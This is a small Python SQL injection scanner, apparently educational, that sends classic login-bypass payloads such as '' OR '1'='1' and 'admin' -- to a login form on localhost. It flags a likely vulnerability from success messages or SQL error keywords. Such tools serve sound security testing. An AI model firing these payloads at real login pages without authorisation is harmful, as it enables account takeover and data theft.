# scanner.py
# Simple SQL Injection Scanner
# FOR EDUCATIONAL PURPOSES ONLY

import requests
import time

# =========================================
# TARGET
# =========================================

url = "http://127.0.0.1:5000/"

# =========================================
# PAYLOADS
# =========================================

payloads = [

    "'",

    "''",

    "' OR '1'='1",

    "' OR '1'='1",

    "admin' --",

    "' UNION SELECT null --",

]

# =========================================
# ERROR KEYWORDS
# =========================================

sql_errors = [

    "sql syntax",
    "sqlite",
    "mysql",
    "syntax error",
    "unclosed quotation mark",
    "database error",
    "warning",

]

# =========================================
# START SCAN
# =========================================

print("\n==============================")
print(" SQL Injection Scanner")
print("==============================\n")

time.sleep(1)

for payload in payloads:

    print(f"[+] Testing Payload: {payload}")

    data = {

        "username": payload,
        "password": payload,

    }

    try:

        response = requests.post(url, data=data)

        response_text = response.text.lower()

        # =================================
        # CHECK LOGIN BYPASS
        # =================================

        if "logged in successfully" in response_text:

            print("[!!!] LOGIN BYPASS POSSIBLE")
            print("[!!!] Vulnerable to SQL Injection\n")

        # =================================
        # CHECK SQL ERRORS
        # =================================

        elif any(error in response_text for error in sql_errors):

            print("[!!!] SQL ERROR DETECTED")
            print("[!!!] Possible SQL Injection\n")

        # =================================
        # NORMAL RESPONSE
        # =================================

        else:

            print("[-] No vulnerability detected\n")

    except Exception as e:

        print(f"[ERROR] {e}\n")

print("==============================")
print(" Scan Finished")
print("==============================")